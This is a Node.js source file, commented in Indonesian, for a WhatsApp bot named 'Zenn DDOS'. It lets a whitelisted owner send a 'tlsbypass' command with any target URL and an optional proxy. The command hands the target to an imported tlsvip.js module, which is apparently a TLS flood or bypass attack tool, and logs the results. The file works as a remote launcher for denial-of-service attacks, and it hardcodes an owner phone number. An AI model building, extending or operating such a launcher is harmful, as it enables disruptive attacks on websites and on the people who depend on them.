const makeWASocket = require("@whiskeysockets/baileys").default;
const { useSingleFileAuthState } = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const tlsvip = require("./tlsvip"); // Import modul tlsvip.js

// Konfigurasi penyimpanan sesi
const { state, saveState } = useSingleFileAuthState("auth_info.json");

// Konfigurasi nomor pemilik, nama bot, dan whitelist
const OWNER_NUMBER = "6283832677743@s.whatsapp.net"; // Nomor pemilik
const BOT_USERNAME = "Zenn DDOS"; // Nama bot
const WHITELIST_NUMBERS = [
    OWNER_NUMBER, // Pemilik selalu memiliki akses
];
let defaultReply = "Maaf, Anda tidak memiliki izin untuk menggunakan bot ini."; // Balasan default

async function startBot() {
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true, // Tampilkan QR Code di terminal
    });

    // Menangani QR code
    sock.ev.on("connection.update", (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "close") {
            const shouldReconnect =
                (lastDisconnect.error &&
                    Boom.isBoom(lastDisconnect.error) &&
                    lastDisconnect.error.output.statusCode !==
                        DisconnectReason.loggedOut) ||
                false;
            console.log(
                "Koneksi terputus. Reconnect: ",
                shouldReconnect
            );
            if (shouldReconnect) {
                startBot();
            }
        } else if (connection === "open") {
            console.log(`Bot "${BOT_USERNAME}" terhubung ke WhatsApp`);
        }
    });

    // Menangani pesan yang masuk
    sock.ev.on("messages.upsert", async (msgUpdate) => {
        const messages = msgUpdate.messages;
        if (!messages[0].key.fromMe && msgUpdate.type === "notify") {
            const message = messages[0];
            const from = message.key.remoteJid;
            const text = message.message.conversation;

            console.log(`Pesan dari ${from}: ${text}`);

            // Log pesan ke file
            logMessage(from, text);

            // Periksa apakah nomor ada di whitelist
            if (WHITELIST_NUMBERS.includes(from)) {
                await handleCommand(sock, from, text);
            } else {
                console.log(`Akses ditolak untuk nomor: ${from}`);
                await sock.sendMessage(from, { text: defaultReply });
            }
        }
    });

    sock.ev.on("creds.update", saveState);
}

// Menangani perintah
async function handleCommand(sock, from, text) {
    if (text.toLowerCase() === "status") {
        await sock.sendMessage(from, {
            text: `Halo, saya ${BOT_USERNAME}. Bot ini aktif dan siap digunakan.`,
        });
    } else if (text.toLowerCase() === "menu") {
        const menu = `
*Menu Zenn DDOS*
1. status - Cek status bot.
2. menu - Tampilkan menu ini.
3. tlsbypass <target> [proxy] - Jalankan bypass menggunakan tlsvip.js.
        `;
        await sock.sendMessage(from, { text: menu });
    } else if (text.toLowerCase().startsWith("tlsbypass ")) {
        const args = text.slice(10).trim().split(" ");
        const target = args[0];
        const proxy = args[1] || null; // Proxy opsional

        if (!isValidUrl(target)) {
            await sock.sendMessage(from, { text: "URL target tidak valid. Pastikan Anda menggunakan format yang benar, seperti https://example.com." });
            return;
        }

        try {
            const options = proxy ? { proxy } : {}; // Tambahkan opsi proxy jika tersedia
            const result = await tlsvip(target, options); // Jalankan bypass
            logBypass(target, proxy, "Berhasil");
            await sock.sendMessage(from, { text: result });
        } catch (error) {
            logBypass(target, proxy, "Gagal");
            await sock.sendMessage(from, { text: `Terjadi kesalahan: ${error.message}` });
        }
    } else {
        await sock.sendMessage(from, { text: "Perintah tidak dikenali. Ketik 'menu' untuk melihat daftar perintah." });
    }
}

// Validasi URL
function isValidUrl(string) {
    try {
        new URL(string);
        return true;
    } catch (_) {
        return false;
    }
}

// Log pesan ke file
function logMessage(from, text) {
    const log = `[${new Date().toISOString()}] Pesan dari ${from}: ${text}\n`;
    fs.appendFileSync("bot_log.txt", log);
}

// Log hasil bypass ke file
function logBypass(target, proxy, status) {
    const log = `[${new Date().toISOString()}] Target: ${target} | Proxy: ${proxy || "None"} | Status: ${status}\n`;
    fs.appendFileSync("bypass_log.txt", log);
}

// Jalankan bot
startBot();